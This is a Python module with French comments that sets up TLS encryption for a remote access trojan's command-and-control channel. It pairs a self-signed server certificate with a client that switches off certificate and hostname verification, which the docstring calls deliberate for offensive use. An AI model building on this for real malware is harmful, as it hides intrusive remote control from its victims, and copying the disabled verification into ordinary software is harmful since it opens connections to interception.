"""
Module de configuration TLS pour le chiffrement des communications RAT.

Le serveur utilise un certificat auto-signé (server.crt + server.key).
Le client se connecte sans vérification du certificat (CERT_NONE),
ce qui est volontaire dans ce contexte offensif.
"""

import ssl
from pathlib import Path

# Chemin vers les certificats (relatif à la racine du projet)
CERT_DIR = Path(__file__).parent.parent.parent.parent / "certs"
CERT_FILE = CERT_DIR / "server.crt"
KEY_FILE = CERT_DIR / "server.key"


def create_server_ssl_context() -> ssl.SSLContext:
    if not CERT_FILE.exists() or not KEY_FILE.exists():
        raise FileNotFoundError(
            f"Certificat TLS introuvable dans {CERT_DIR}. Lance d'abord : bash generate_cert.sh"
        )

    # Contexte serveur : on impose TLS, on charge notre cert auto-signé
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.load_cert_chain(certfile=str(CERT_FILE), keyfile=str(KEY_FILE))

    return context


def create_client_ssl_context() -> ssl.SSLContext:
    # Contexte client : pas de vérification du certificat serveur
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.minimum_version = ssl.TLSVersion.TLSv1_2

    return context
